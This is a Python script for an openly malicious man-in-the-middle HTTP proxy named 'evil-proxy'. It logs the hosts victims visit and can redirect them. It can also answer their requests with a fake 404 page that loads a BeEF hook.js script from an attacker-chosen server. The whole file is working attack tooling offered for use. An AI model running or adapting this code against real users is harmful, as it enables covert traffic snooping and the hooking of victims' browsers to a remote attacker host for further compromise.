import socket
import requests
import os

os.system("clear")

url_list = []

banner = """
            _ _                                 
  _____   _(_) |      _ __  _ __ _____  ___   _ 
 / _ \ \ / / | |_____| '_ \| '__/ _ \ \/ / | | |
|  __/\ V /| | |_____| |_) | | | (_) >  <| |_| |
 \___| \_/ |_|_|     | .__/|_|  \___/_/\_\\__, |
  v1.1               |_|                  |___/
================================================
           a evil mitm proxy tool
================================================

"""
print(banner)
print("""
[1] beef hook
[2] redirect
[3] normal http proxy

[INFO] all of these snoop the http requests the client makes and can be accesed by pressing ctrl+c 
""")
op = input("[+] enter option: ")

if op == "1":
    beef_url = input("[+] enter the beef server ip: ")
elif op == "2":
    redirect_url = input("[+] enter the url to redirect too: ")

else:
    pass

def get_data(url):
    global op

    if op == "3":
        url = "http://"+url
        data = requests.get(url)
        if data.status_code == 200:
            print("[OK] client url code 200")
            return data.text
        else:
            print("[ERROR] client url didn't respond code("+str(data.status_code)+")")
            raise "200 error"
    elif op == "2":
        global redirect_url
        return """
<!DOCTYPE html>
<html>
   <head>
      <title>HTML Meta Tag</title>
      <meta http-equiv = "refresh" content = "3; url = """+redirect_url+""""/>
   </head>
   <body>
      <p>directing to url</p>
   </body>
</html>
        """
    elif op == "1":
        global beef_url
        return """<title>404 Page Not Found</title>
<main>
    <p>404 Page Not Found</p>
    <script src="http://"""+beef_url+""":3000/hook.js"></script>
</main>"""      
    else:
        pass

def parse_req(data):
    global url_list, op

    if op == "2":
        global redirect_url
    else:
        redirect_url = "None"

    try:
        req = data.split("Host: ")
        r = req[1]
        r = r.split("\n")

        url = r[0]
        url = url.replace("\n","")
        url = url.replace(" ","")
        url = url.replace("\r","")
        
        if url == redirect_url:
            pass
        else:
            url_list.append(url)
            req_url = url

        print("[OK] client url: "+req_url)
        text = get_data(req_url)
        return text
    except Exception as e:
        print("[ERROR] invalid request by client, sending error")
        er = """
        INTERNAL SERVER ERROR
        server error: """+str(e)+"""
        """
        return er


buff = 4048
r = 0

port = int(input("[+] enter port to run on: "))

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("",port))

        while True:
            os.system("clear")

            print("[+] waiting for connection")
            print("[+] req num: "+str(r))
            s.listen()
            conn, addr = s.accept()

            print("[OK] client connected ip: "+str(addr[0]))

            with conn:
                t = True
                while t:
                    data = conn.recv(buff)
                    req_url = parse_req(data.decode())
                    r += 1
                    try:
                        conn.send(req_url.encode())
                    except BrokenPipeError:
                        print("[ERROR] client has diconected")
                    except UnicodeDecodeError:
                        print("[ERROR] client went to https website")
                    except AttributeError:
                        print("[ERROR] attribute error, we don't know what happend here")
                    t = False
except KeyboardInterrupt:
    print("[Ok] user quit, displaying url's that where visited...")
    for i in url_list:
        print("[-] url: "+i)

'''

what a request looks like: 

GET http://example.com/ HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

all we need is the host, so the progam needs to see:

http://exapmle.com 
so we do lot's of parseing and selecting in parse_req
'''